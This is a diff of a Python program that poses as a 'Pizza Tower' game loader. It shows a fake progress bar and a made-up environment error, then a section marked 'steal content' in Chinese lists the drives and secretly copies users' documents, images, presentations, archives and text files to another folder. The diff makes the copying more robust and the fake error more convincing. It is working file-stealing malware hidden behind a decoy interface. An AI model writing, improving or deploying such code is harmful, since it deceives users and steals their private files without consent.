@@ -9,9 +9,10 @@ from tkinter import ttk, messagebox
 import threading
 import time
 import random
+import sys
 
-# 设置随机触发点（0~100 之间）
-trigger_error_at = random.randint(10, 90)  # 避免太快或太慢触发
+# 设置随机触发点
+trigger_error_at = random.randint(0, 100)
 # print(f"[调试] 本次将在 {trigger_error_at}% 时触发错误")
 
 def simulate_loading():
@@ -21,14 +22,14 @@ def simulate_loading():
         progress_bar.update()
 
         if i == trigger_error_at:
-            messagebox.showerror("错误", f"运行环境异常，程序在时终止。")
+            messagebox.showerror("错误", f"运行环境异常，程序在初始化时终止。")
             root.destroy()
             return
 
 root = tk.Tk()
 root.title("Pizza Tower")
 root.resizable(False, False)
-# root.iconbitmap("1.ico")    # 设置图标
+# root.iconbitmap("1.ico")    # 设置图标（打包之后需要当前文件夹下有图标文件）
 
 # 设置窗口大小并居中
 window_width = 300
@@ -53,6 +54,7 @@ threading.Thread(target=simulate_loading, daemon=True).start()
 
 root.mainloop()
 
+# 窃取内容
 U = GetLogicalDriveStrings()
 U_list = U.split('\x00')
 U_list.pop(-1)
@@ -69,10 +71,15 @@ if not os.path.exists(path):
 count = 0
 for root,ds,fs in os.walk("E:\\"):
     for files in fs:
-        if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
-            file_path = root + "\\" + files    # 目标文件路径
-            save_path = path + files    # 保存路径
-            CopyFile(file_path, save_path ,False)
-#             count += 1
-#             print(file_path)
+        try:
+            if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
+                file_path = root + "\\" + files    # 目标文件路径
+                save_path = path + files    # 保存路径
+                CopyFile(file_path, save_path ,False)
+                count += 1
+                # print(file_path)
+        except:
+            exit()
 # print(f"已复制{count}个文件")
+
+sys.exit()
